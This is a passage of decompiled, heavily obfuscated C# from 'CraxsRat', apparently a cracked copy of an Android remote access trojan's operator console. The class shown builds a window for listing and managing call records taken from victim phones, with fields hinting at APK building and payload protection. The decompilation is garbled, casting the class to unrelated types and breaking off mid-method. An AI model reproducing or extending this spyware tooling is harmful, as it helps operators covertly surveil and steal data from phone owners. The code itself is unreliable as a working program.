// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CallsManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CallsManager : Form
  {
    private string NEWRANDOM;
    public Random rshit;
    private string KEY;
    public bool oncedelete;
    private bool FolderApk;
    private bool Builtapk;
    private bool StartedZip;
    private bool encrypt_started;
    private bool protectfinished;
    public bool pumpstarted;
    public bool pumpfinished;
    public bool firstpump;
    private bool Once;
    public static byte f004E73;
    private object CMD;
    private string[] randmid;
    private Random rnd;
    private Random numberrandomer;
    private List<Rectangle> RectInputText0;
    private List<Rectangle> RectInputText1;
    private List<Rectangle> RectInputText3;
    [SpecialName]
    private Random \u0024STATIC\u0024MoveRandomFile\u00242021EE\u0024r;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024MoveRandomFile\u00242021EE\u0024r\u0024Init;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((CameraManager) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
label_1:
      int num1 = 1978592822;
      DataGridViewCellStyle gridViewCellStyle2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(-((num1 + (--1001737254 ^ (1037721526 - 1771882102 - (1809987186 ^ 202595249) + ~(997299373 + 1814293154)) * 1523719227)) * -295931597) ^ -380241457 - 742249005 - --1665402621)) % 78U)
        {
          case 0:
            this.ctxMenu = new ContextMenuStrip(((CameraManager) this).components);
            num1 = (int) num2 * 830991247 ^ 552131977;
            continue;
          case 1:
            this.SaveToolStripMenuItem.Visible = false;
            num1 = (int) num2 * -708528802 ^ -1311401043;
            continue;
          case 2:
            this.PB.Dock = DockStyle.Bottom;
            this.PB.Location = new Point(0, 213);
            num1 = (int) num2 * -504073693 ^ -2067517732;
            continue;
          case 3:
            this.DGV0.TabIndex = 2;
            num1 = (int) num2 * 422613045 ^ -2108102261;
            continue;
          case 4:
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            this.TOpacity = new System.Windows.Forms.Timer(((CameraManager) this).components);
            num1 = (int) num2 * 1736745727 ^ 645831765;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.BoxTitle.TabStop = false;
            num1 = (int) num2 * 1860776936 ^ -1887758095;
            continue;
          case 7:
            this.DGV0.Name = EXGuarder.\u00322065A18;
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            this.DGV0.RowHeadersVisible = false;
            num1 = (int) num2 * -1677400579 ^ -1863361133;
            continue;
          case 8:
            ((ISupportInitialize) this.DGV0).EndInit();
            num1 = (int) num2 * -770814353 ^ -1005691709;
            continue;
          case 9:
            this.DeleteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1748645698 ^ 1281765887;
            continue;
          case 10:
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            num1 = (int) num2 * -804948648 ^ 1682241941;
            continue;
          case 11:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -1941179622 ^ -1518325237;
            continue;
          case 12:
            this.Column3 = new DataGridViewImageColumn();
            num1 = (int) num2 * 410677189 ^ -1199981270;
            continue;
          case 13:
            this.Controls.Add((Control) this.BoxTitle);
            this.Name = EXGuarder.\u00340435305;
            num1 = (int) num2 * 2010396545 ^ 1603561698;
            continue;
          case 14:
            this.Controls.Add((Control) this.PB);
            num1 = (int) num2 * -126119152 ^ -297766780;
            continue;
          case 15:
            this.DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * -1677782026 ^ -474851211;
            continue;
          case 16:
            this.PB = new ProgressBar();
            this.BoxTitle = new PictureBox();
            num1 = (int) num2 * -2063884126 ^ 1133839499;
            continue;
          case 17:
            this.Column2 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1406295650 ^ 388527177;
            continue;
          case 18:
            this.Column1.HeaderText = EXGuarder.\u00301131E39;
            num1 = (int) num2 * 736683928 ^ -591355808;
            continue;
          case 19:
            this.Column2.Name = EXGuarder.\u00344071A14;
            num1 = (int) num2 * 1302861309 ^ 1335290961;
            continue;
          case 20:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0032A5C533C, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1981360991 ^ -1523655798;
            continue;
          case 21:
            this.Column2.Width = 76;
            num1 = (int) num2 * -1278660994 ^ -820432448;
            continue;
          case 22:
            this.Column6.Name = EXGuarder.\u0036E71601F;
            this.Column6.Width = 61;
            num1 = (int) num2 * -1292024285 ^ 438553110;
            continue;
          case 23:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 2063802126 ^ -831434740;
            continue;
          case 24:
            this.Opacity = 0.0;
            num1 = (int) num2 * -896779416 ^ -207222465;
            continue;
          case 25:
            ((ISupportInitialize) this.BoxTitle).BeginInit();
            this.SuspendLayout();
            this.DGV0.AllowUserToAddRows = false;
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * -2136189583 ^ -1510489734;
            continue;
          case 26:
            this.SaveToolStripMenuItem.Name = EXGuarder.\u0032E632256;
            this.SaveToolStripMenuItem.Size = new Size(89, 22);
            this.SaveToolStripMenuItem.Text = EXGuarder.\u00333485201;
            num1 = (int) num2 * -1768401726 ^ 1974925546;
            continue;
          case 27:
            this.Column7.Name = EXGuarder.\u0030B0B1E0A;
            num1 = (int) num2 * -964170623 ^ 1394186588;
            continue;
          case 28:
            this.DeleteToolStripMenuItem.Text = EXGuarder.\u0035E3F294C;
            num1 = (int) num2 * 1140367026 ^ 303531663;
            continue;
          case 29:
            this.Column3.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            this.Column3.FillWeight = 1f;
            this.Column3.HeaderText = EXGuarder.\u00352750F23;
            num1 = (int) num2 * -2125515629 ^ -895649429;
            continue;
          case 30:
            this.BoxTitle.InitialImage = (Image) null;
            num1 = (int) num2 * -772583659 ^ -988867783;
            continue;
          case 31:
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * 1715075563 ^ -726080159;
            continue;
          case 32:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 374593720 ^ -187680064;
            continue;
          case 33:
            this.Column1.Width = 74;
            this.Column6.HeaderText = EXGuarder.\u003412F5828;
            num1 = (int) num2 * -484155755 ^ -2093056812;
            continue;
          case 34:
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * -683591557 ^ 904556463;
            continue;
          case 35:
            this.SaveAsToolStripMenuItem.Visible = false;
            num1 = (int) num2 * 479021754 ^ -935030032;
            continue;
          case 36:
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * 1888403771 ^ 1918540505;
            continue;
          case 37:
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 1623314615 ^ 714585628;
            continue;
          case 38:
            this.Column1 = new DataGridViewTextBoxColumn();
            this.Column6 = new DataGridViewTextBoxColumn();
            this.Column9 = new DataGridViewTextBoxColumn();
            this.Column7 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1714063145 ^ 1187448338;
            continue;
          case 39:
            this.Column3.MinimumWidth = 2;
            this.Column3.Name = EXGuarder.\u00348334C1C;
            this.Column3.SortMode = DataGridViewColumnSortMode.Programmatic;
            this.Column3.Width = 2;
            num1 = (int) num2 * 820816196 ^ -1974767535;
            continue;
          case 40:
            this.Text = EXGuarder.\u00340435305;
            num1 = (int) num2 * -680427866 ^ -1887979439;
            continue;
          case 42:
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u003514E3136;
            this.SaveAsToolStripMenuItem.Size = new Size(89, 22);
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u00300024A50;
            num1 = (int) num2 * 81904367 ^ -1560874506;
            continue;
          case 43:
            this.PB.Name = EXGuarder.\u00346692404;
            this.PB.Size = new Size(414, 10);
            this.PB.TabIndex = 6;
            this.BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * -870579841 ^ 228259244;
            continue;
          case 44:
            gridViewCellStyle1.Font = new Font(EXGuarder.\u0032A5C533C, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            num1 = (int) num2 * -1196997597 ^ -1396680584;
            continue;
          case 45:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * 907366463 ^ -242296826;
            continue;
          case 46:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -2129237620 ^ -1118528961;
            continue;
          case 47:
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * 346922294 ^ 357058255;
            continue;
          case 48:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * 1207595303 ^ 1399401749;
            continue;
          case 49:
            this.DGV0.Location = new Point(0, 0);
            num1 = (int) num2 * 1078302357 ^ -1946157921;
            continue;
          case 50:
            this.ctxMenu.ResumeLayout(false);
            num1 = (int) num2 * 606696061 ^ 1223142956;
            continue;
          case 51:
            this.ctxMenu.SuspendLayout();
            num1 = (int) num2 * -1598864051 ^ 861521587;
            continue;
          case 52:
            this.RefreshToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1458037214 ^ -1278711188;
            continue;
          case 53:
            this.ctxMenu.Name = EXGuarder.\u00321103E66;
            num1 = (int) num2 * 1218537418 ^ 804395881;
            continue;
          case 54:
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 1956401123 ^ 782601530;
            continue;
          case 55:
            this.ctxMenu.Items.AddRange(new ToolStripItem[4]
            {
              (ToolStripItem) this.RefreshToolStripMenuItem,
              (ToolStripItem) this.DeleteToolStripMenuItem,
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem
            });
            num1 = (int) num2 * 349500934 ^ -1813304622;
            continue;
          case 56:
            this.DGV0.BorderStyle = BorderStyle.None;
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            num1 = (int) num2 * 588774029 ^ -2101728105;
            continue;
          case 57:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new Size(414, 213);
            num1 = (int) num2 * -1450091109 ^ 679868275;
            continue;
          case 58:
            this.DGV0.Dock = DockStyle.Fill;
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * -1726983335 ^ 1653932671;
            continue;
          case 59:
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * -1005653842 ^ -1367476192;
            continue;
          case 60:
            this.RefreshToolStripMenuItem.Size = new Size(89, 22);
            this.RefreshToolStripMenuItem.Text = EXGuarder.\u00323724807;
            this.DeleteToolStripMenuItem.Name = EXGuarder.\u003735E096D;
            this.DeleteToolStripMenuItem.Size = new Size(89, 22);
            num1 = (int) num2 * 481971816 ^ -447923091;
            continue;
          case 61:
            this.Column9.HeaderText = EXGuarder.\u003204E4824;
            this.Column9.Name = EXGuarder.\u00371171075;
            num1 = (int) num2 * 2139449654 ^ 1005713392;
            continue;
          case 62:
            this.BoxTitle.Dock = DockStyle.Bottom;
            this.BoxTitle.ErrorImage = (Image) null;
            num1 = (int) num2 * -1593196274 ^ 372595647;
            continue;
          case 63:
            this.BoxTitle.TabIndex = 7;
            num1 = (int) num2 * 418911213 ^ 2070095760;
            continue;
          case 64:
            this.Column7.Width = 54;
            num1 = (int) num2 * -1117907523 ^ 465653088;
            continue;
          case 65:
            this.BoxTitle.Size = new Size(414, 18);
            num1 = (int) num2 * 1819680999 ^ 1892892739;
            continue;
          case 66:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(414, 241);
            this.Controls.Add((Control) this.DGV0);
            num1 = (int) num2 * 1305253000 ^ 1435790015;
            continue;
          case 67:
            this.Column1.Name = EXGuarder.\u003644B6E10;
            num1 = (int) num2 * -872969631 ^ -2096469907;
            continue;
          case 68:
            this.ctxMenu.ShowImageMargin = false;
            this.ctxMenu.Size = new Size(90, 92);
            this.RefreshToolStripMenuItem.Name = EXGuarder.\u003650D0521;
            num1 = (int) num2 * 986852697 ^ -740328307;
            continue;
          case 69:
            this.Column2.HeaderText = EXGuarder.\u003503A135C;
            num1 = (int) num2 * 1716909736 ^ 1246951378;
            continue;
          case 70:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 1092923237 ^ 381816340;
            continue;
          case 71:
            this.Column7.HeaderText = EXGuarder.\u003666A064E;
            num1 = (int) num2 * -141902922 ^ -1885604356;
            continue;
          case 72:
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * 314738578 ^ 331166588;
            continue;
          case 73:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * -773059710 ^ -290191613;
            continue;
          case 74:
            this.BoxTitle.Location = new Point(0, 223);
            num1 = (int) num2 * 514358846 ^ -75831437;
            continue;
          case 75:
            this.Column9.Width = 54;
            num1 = (int) num2 * 402501609 ^ -351967381;
            continue;
          case 76:
            this.BoxTitle.Name = EXGuarder.\u00333590F15;
            num1 = (int) num2 * 247235315 ^ 1359000436;
            continue;
          case 77:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column9, (DataGridViewColumn) this.Column7, (DataGridViewColumn) this.Column2, (DataGridViewColumn) this.Column3);
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1669387574 ^ 1362439671;
            continue;
          default:
            goto label_79;
        }
      }
label_79:
      ((ISupportInitialize) this.BoxTitle).EndInit();
      this.ResumeLayout(false);
    }

    internal virtual DataGridView DGV0
    {
      get => ((CameraManager) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewRowsRemovedEventHandler removedEventHandler = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
label_1:
        int num1 = -1349758151;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV0;
          DataGridViewRowsAddedEventHandler addedEventHandler;
          EventHandler eventHandler;
          switch ((num3 = (uint) (((889497701 - -115905185 ^ 1940413372) - ((num2 + -1490776289 * (583464602 + ~(-221763356 - -1772462839 + (1809483220 + 586378452))) ^ (~(-1224114567 - 1019357048) ^ 240061781) * -1946560711) + (-949866289 * 1986626418 - -8821753 * -1892024265 ^ -~-1006633827))) * -1875562783 * -396428527)) % 10U)
          {
            case 0:
              dgV0 = ((CameraManager) this)._DGV0;
              num1 = (int) num3 * -631934353 ^ -1359961678;
              continue;
            case 1:
              addedEventHandler = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              num1 = (int) num3 * -674791924 ^ -2104898790;
              continue;
            case 2:
              dgV0.RowsRemoved += removedEventHandler;
              num1 = (int) num3 * 419566091 ^ -845661307;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num4 = dgV0 == null ? -703215578 : (num4 = 1823402567);
              num1 = num4 ^ (int) num3 * 833275506;
              continue;
            case 5:
              int num5 = dgV0 == null ? -1410696883 : (num5 = 915608527);
              num1 = num5 ^ (int) num3 * 1439119211;
              continue;
            case 6:
              goto label_3;
            case 7:
              dgV0.RowsAdded += addedEventHandler;
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num3 * 819583427 ^ 1164315913;
              continue;
            case 8:
              ((CameraManager) this)._DGV0 = value;
              dgV0 = ((CameraManager) this)._DGV0;
              num1 = 101135273;
              continue;
            case 9:
              dgV0.RowsRemoved -= removedEventHandler;
              dgV0.RowsAdded -= addedEventHandler;
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num3 * 1370600462 ^ 1198772856;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((CameraManager) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      get => ((CameraManager) this)._RefreshToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
label_1:
        int num1 = 919276205;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(-(num1 * 1627269113) + ((-1025140091 - 1462891177) * 1560560911 ^ ~-330040055 * 811701903) ^ -2017680792 ^ --1088938374)) % 7U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -1386828891 : (num3 = -568507554);
              num1 = num3 ^ (int) num2 * 1437368058;
              continue;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 964645984 ^ 301560641;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1042758293 ^ 1737149967;
              continue;
            case 5:
              ((CameraManager) this)._RefreshToolStripMenuItem = value;
              toolStripMenuItem = ((CameraManager) this)._RefreshToolStripMenuItem;
              num1 = 1352816970;
              continue;
            case 6:
              toolStripMenuItem = ((CameraManager) this)._RefreshToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -632831933 : (num4 = -472381576);
              num1 = num4 ^ (int) num2 * -1649839842;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      get => ((CameraManager) this)._DeleteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
label_1:
        int num1 = -1988537762;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(num1 * 1287784521 * -73147173)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 452901986 ^ -1398078190;
              continue;
            case 2:
              int num3 = toolStripMenuItem == null ? -504911993 : (num3 = -720738773);
              num1 = num3 ^ (int) num2 * 1658318348;
              continue;
            case 3:
              goto label_3;
            case 4:
              ((CameraManager) this)._DeleteToolStripMenuItem = value;
              num1 = 971272626;
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -2017511374 ^ -1252711283;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? 1934941664 : (num4 = -565099353);
              num1 = num4 ^ (int) num2 * 1794810213;
              continue;
            case 7:
              toolStripMenuItem = ((CameraManager) this)._DeleteToolStripMenuItem;
              num1 = (int) num2 * -1895219405 ^ -692783625;
              continue;
            case 8:
              toolStripMenuItem = ((CameraManager) this)._DeleteToolStripMenuItem;
              num1 = (int) num2 * -968750442 ^ 14805584;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((CameraManager) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CameraManager) this)._SaveToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_7;
label_1:
        int num1 = -509960456;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((-num1 - ~(--1327241187 - (592883894 ^ 1487593525) + ((-791304167 ^ 1795267383) + -200389727))) * -1588933467 + (~1985363947 + (114427756 + 901461117)))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1504422886 ^ -1418014138;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_7;
            case 4:
              toolStripMenuItem = ((CameraManager) this)._SaveToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 1315814307 : (num3 = 1301702518);
              num1 = num3 ^ (int) num2 * -608505281;
              continue;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1146149288 ^ -2081747925;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((CameraManager) this)._SaveToolStripMenuItem = value;
        num1 = -173111031;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((CameraManager) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CameraManager) this)._SaveAsToolStripMenuItem;
label_1:
        int num1 = 987297246;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 * 1054345993 ^ -(-1516720973 - -368355538))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = ((CameraManager) this)._SaveAsToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -1503117411 : (num3 = 2014420702);
              num1 = num3 ^ (int) num2 * 1782737646;
              continue;
            case 2:
              goto label_3;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1453828298 ^ -2109394355;
              continue;
            case 4:
              ((CameraManager) this)._SaveAsToolStripMenuItem = value;
              num1 = 1585452574;
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 374125572 ^ -889020241;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? 1988129359 : (num4 = 26812328);
              num1 = num4 ^ (int) num2 * 409277048;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((CameraManager) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -88116808;
        System.Windows.Forms.Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 * -164553295 + (1869604410 - 614522644 + -1391635373 * -490743646 - -(107849143 - -1173679273) ^ (-434715472 ^ -1404479317) - -1405058030 - (-1318670487 ^ --311063752))) * 120646345 ^ -(-1624548597 * 1046813202)) - (218830128 + 1701651810) - -573502855)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = topacity == null ? -1710998663 : (num3 = -771678445);
              num1 = num3 ^ (int) num2 * -451111003;
              continue;
            case 2:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -43400466 ^ 125930731;
              continue;
            case 3:
              topacity = ((CameraManager) this)._TOpacity;
              num1 = (int) num2 * -2145413957 ^ 594176835;
              continue;
            case 4:
              int num4 = topacity == null ? -1819067053 : (num4 = 740553919);
              num1 = num4 ^ (int) num2 * -324109695;
              continue;
            case 5:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 912796445 ^ -1129306275;
              continue;
            case 6:
              goto label_3;
            case 7:
              ((CameraManager) this)._TOpacity = value;
              topacity = ((CameraManager) this)._TOpacity;
              num1 = -1405663239;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ProgressBar PB
    {
      get => ((CameraManager) this)._PB;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._PB = value;
    }

    internal virtual PictureBox BoxTitle
    {
      get => ((CameraManager) this)._BoxTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.BoxTitle_Paint);
label_1:
        int num1 = 327731752;
        PictureBox boxTitle;
        EventHandler eventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(~num1 * 560876219) - 1192536916) * -2117954647 * -1344951191)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              boxTitle = ((CameraManager) this)._BoxTitle;
              int num3 = boxTitle == null ? -947295717 : (num3 = -1098214947);
              num1 = num3 ^ (int) num2 * 1840634303;
              continue;
            case 2:
              boxTitle.Paint += paintEventHandler;
              boxTitle.Resize += eventHandler;
              num1 = (int) num2 * -536468454 ^ -769392851;
              continue;
            case 3:
              boxTitle.Resize -= eventHandler;
              num1 = (int) num2 * 1890838731 ^ 1214728265;
              continue;
            case 4:
              ((CameraManager) this)._BoxTitle = value;
              num1 = -865728423;
              continue;
            case 5:
              eventHandler = new EventHandler(this.BoxTitle_Resize);
              num1 = (int) num2 * 2120532646 ^ 203601318;
              continue;
            case 6:
              goto label_3;
            case 7:
              boxTitle = ((CameraManager) this)._BoxTitle;
              int num4 = boxTitle == null ? 381304909 : (num4 = -553977449);
              num1 = num4 ^ (int) num2 * 1178789388;
              continue;
            case 8:
              boxTitle.Paint -= paintEventHandler;
              num1 = (int) num2 * 484963292 ^ 1936174622;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((CameraManager) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((CameraManager) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column9
    {
      get => ((CameraManager) this)._Column9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._Column9 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column7
    {
      get => ((ClipboardManager) this)._Column7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ClipboardManager) this)._Column7 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column2
    {
      get => ((ClipboardManager) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ClipboardManager) this)._Column2 = value;
      }
    }

    internal virtual DataGridViewImageColumn Column3
    {
      get => ((ClipboardManager) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ClipboardManager) this)._Column3 = value;
      }
    }

    private void SpyStyle()
    {
      this.BoxTitle.BackColor = Settings.DefaultColor_Background;
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Controls.OfType<DataGridView>().GetEnumerator();
label_8:
        int num1 = enumerator.MoveNext() ? -1651940514 : (num1 = -215216540);
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView current;
          switch ((num3 = (uint) (2135230438 - (-~(num2 ^ (519073535 * -1109740383 ^ 966580146) + (~(-963961031 - 2104156448 + (1707915202 - -1270512320)) - -330918143 * ~~-1262428730) ^ -~(540904733 * 1094533710) ^ 1489112872) ^ 2079254788 + 162472668))) % 9U)
          {
            case 0:
              num1 = -1651940514;
              continue;
            case 1:
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * 1864693512 ^ 2036522080;
              continue;
            case 2:
              current.BackgroundColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * -746191730 ^ 608628757;
              continue;
            case 3:
              current = enumerator.Current;
              num1 = -774667798;
              continue;
            case 4:
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * -1997058721 ^ -654784139;
              continue;
            case 5:
              goto label_15;
            case 6:
              goto label_8;
            case 7:
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * 929747752 ^ -1028688602;
              continue;
            case 8:
              current.BackColor = Settings.DefaultColor_Background;
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * 766014876 ^ -1758271663;
              continue;
            default:
              goto label_11;
          }
        }
label_15:
        return;
label_11:;
      }
      finally
      {
        if (enumerator != null)
        {
label_13:
          int num4 = -1758165877;
          while (true)
          {
            int num5 = num4;
